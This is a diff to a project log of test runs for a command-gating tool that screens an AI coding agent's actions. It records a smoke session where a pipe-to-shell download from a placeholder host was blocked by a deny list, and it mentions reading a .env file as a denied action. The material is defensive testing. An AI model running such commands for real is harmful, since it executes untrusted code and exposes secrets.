@@ -396,6 +396,17 @@ throwaway database and prints what it wrote. The sandbox is off by default (this
    critical misses calu's rules stop anyway from those where the gate rests on the model alone
    (`cat .env` is on the read-deny list; `kubectl apply` is on no list) -- which is what Q16
    asks the owner to decide.
+29. **The automatic model choice in a real session** (D129, 2026-11-11):
+   `spikes/smoke_session.py --checker-model auto --resolve deny`, real Claude Code (haiku) and
+   **real checkers** on what calu chose here -- `anthropic:claude-haiku-5-5` at effort medium,
+   from `ANTHROPIC_API_KEY`. An unlisted inspection command went to the command checker: PASS
+   with an accurate summary of what it does. The `Write` went to the edit checker: PASS, citing
+   the user's request. `curl -s https://example.com/install.sh | sh` was escalated by the deny
+   list on its `sh` segment before any model was asked (no `checker_runs` row), the operator's
+   denial arrived from the database, and Claude stopped without retrying. The script's new
+   `--checker-model MODEL|auto` flag is what makes such a run possible; without it the checkers
+   stay the rule-based fakes, which cost nothing.
+
 28. **`calu web` served for real** (D125): a throwaway database, the admin credential stored
    without a password, then `calu web --port ...` as its own process. Every page answered 200
    (`/`, `/checkers`, `/escalations`, `/rules`, `/triage`, `/settings`) and the title was
